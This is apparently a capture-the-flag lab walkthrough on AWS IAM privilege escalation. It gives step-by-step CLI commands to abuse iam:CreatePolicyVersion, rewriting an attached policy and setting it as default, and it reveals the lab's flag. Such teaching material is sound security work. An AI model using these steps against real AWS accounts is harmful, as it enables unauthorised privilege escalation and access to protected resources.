# Walkthrough: CreatePolicyVersion Privilege Escalation

## Lab Objective

Learn how to identify and exploit the `iam:CreatePolicyVersion` permission to escalate privileges and retrieve a flag stored as an IAM role tag.

## Scenario

You have been provided with access to an entry role with limited permissions. Your goal is to escalate your privileges and retrieve the flag stored as a tag on an IAM role.

## Prerequisites

- AWS CLI installed and configured
- Role ARN from the lab deployment
- Basic understanding of AWS IAM

## Setup

### Step 1: Assume the Lab Entry Role

Assume the lab entry role using the role ARN provided by the lab deployment:

```bash
# Replace with your specific role ARN from the deployment output
ROLE_ARN="arn:aws:iam::ACCOUNT_ID:role/specter-lab-createpolicyversion-entry"

# Assume the role and get temporary credentials
CREDS=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name lab-session --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text)

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo $CREDS | awk '{print $3}')
export AWS_DEFAULT_REGION="us-east-1"
```

Verify your identity:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
  "UserId": "AROA...:lab-session",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-createpolicyversion-entry/lab-session"
}
```

Note that your ARN shows `assumed-role` indicating you're using temporary credentials from the entry role.

## Reconnaissance

### Step 2: Discover Your Permissions

First, let's understand what you can do with your current permissions.

```bash
# Extract the role name from your assumed role session
ROLE_NAME=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
echo "Current role: $ROLE_NAME"

# List policies attached to your role
aws iam list-attached-role-policies --role-name $ROLE_NAME | jq

# Set the Policy Arn for future use
POLICY_ARN=$(aws iam list-attached-role-policies --role-name $ROLE_NAME | jq -r '.AttachedPolicies[].PolicyArn')
```

You should see a customer-managed policy attached to your role.

### Step 3: Examine the Attached Policy

```bash
# Get policy details
aws iam get-policy --policy-arn $POLICY_ARN | jq

# Get the default policy version
aws iam get-policy-version --policy-arn $POLICY_ARN --version-id v1 | jq
```

### Step 4: Analyze Current Permissions

Review the policy document. You should see:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DescribeSelf",
      "Effect": "Allow",
      "Action": [
        "iam:GetUser",
        "iam:ListAttachedUserPolicies",
        "iam:GetPolicy",
        "iam:GetPolicyVersion",
        "iam:ListPolicyVersions"
      ],
      "Resource": "*"
    },
    {
      "Sid": "EscalationVector",
      "Effect": "Allow",
      "Action": [
        "iam:CreatePolicyVersion"
      ],
      "Resource": "arn:aws:iam::*:policy/specter-lab-createpolicyversion-policy"
    }
  ]
}
```

**Key Finding**: You have `iam:CreatePolicyVersion` permission on the policy attached to you!

### Step 5: Attempt to Access the Flag (Should Fail)

```bash
# Try to list roles
aws iam list-roles --query 'Roles[?contains(RoleName, `flag`)].RoleName' | jq

# Try to get the flag holder role
aws iam get-role --role-name specter-lab-createpolicyversion-flag-holder | jq
```

Both commands should fail with "AccessDenied" errors.

## Exploitation

### Step 6: Create an Escalated Policy Document

Create a file named `escalated-policy.json` with the following content:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DescribeSelf",
      "Effect": "Allow",
      "Action": [
        "iam:GetUser",
        "iam:ListAttachedUserPolicies",
        "iam:GetPolicy",
        "iam:GetPolicyVersion",
        "iam:ListPolicyVersions"
      ],
      "Resource": "*"
    },
    {
      "Sid": "EscalationVector",
      "Effect": "Allow",
      "Action": [
        "iam:CreatePolicyVersion"
      ],
      "Resource": "arn:aws:iam::*:policy/specter-lab-createpolicyversion-policy"
    },
    {
      "Sid": "ReadFlagFromRoleTags",
      "Effect": "Allow",
      "Action": [
        "iam:GetRole",
        "iam:ListRoleTags",
        "iam:ListRoles"
      ],
      "Resource": "*"
    }
  ]
}
```

### Step 7: Create the New Policy Version

```bash
aws iam create-policy-version --policy-arn $POLICY_ARN --policy-document file://escalated-policy.json --set-as-default | jq
```

The `--set-as-default` flag makes this new version immediately active!

### Step 8: Verify the Escalation

```bash
# Check policy versions
aws iam list-policy-versions --policy-arn $POLICY_ARN | jq

# Get the new default version
aws iam get-policy-version --policy-arn $POLICY_ARN --version-id v2 | jq    
```

## Capture the Flag

### Step 9: Retrieve the Flag

Now that you have escalated privileges, retrieve the flag:

```bash
# List roles containing "flag"
aws iam list-roles --query 'Roles[?contains(RoleName, `flag`)].RoleName' | jq

# Get the flag value from the role tags
aws iam get-role --role-name specter-lab-createpolicyversion-flag-holder --query 'Role.Tags[?Key==`flag`].Value' --output text
```

Expected output:
```
SPECTER:cr34t3_p0l1cy_v3rs10n_pwn3d
```

## Understanding the Attack

### Why This Works

- IAM allows up to 5 versions of a customer-managed policy
- The `--set-as-default` flag makes the new version immediately active
- The policy is attached to your user, so you inherit the new permissions instantly
- No additional authentication or approval is required
- IAM role tags can contain any data and are readable with `iam:GetRole` or `iam:ListRoleTags` permissions

## Additional Resources

- [AWS IAM Policy Versions](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html)
- [Rhino Security Labs: AWS Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)

